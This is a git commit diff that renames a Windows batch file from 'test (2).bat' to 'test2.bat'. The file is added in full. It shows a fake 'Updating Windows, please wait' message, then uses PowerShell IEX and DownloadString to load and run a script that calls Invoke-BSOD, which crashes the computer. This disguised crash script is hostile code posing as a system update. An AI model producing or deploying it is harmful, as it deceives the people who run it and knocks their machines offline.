e31877a004d4ada3d1daae0e5a05b882df8721fd
SSBhaumik <36877365+SSBhaumik@users.noreply.github.com>
2022-01-30 22:46:25 +0530

    Rename test (2).bat to test2.bat

--- test (2).bat
+++
@@ -1,3 +0,0 @@
-@echo off
-echo Updating Windows, please wait
-powershell IEX((New-Object Net.Webclient).DownloadString('"%userprofile%\Documents\bh3oub0b.ps1"'));Invoke-BSOD
---
+++ test2.bat
@@ -0,0 +1,3 @@
+@echo off
+echo Updating Windows, please wait
+powershell IEX((New-Object Net.Webclient).DownloadString('"%userprofile%\Documents\bh3oub0b.ps1"'));Invoke-BSOD
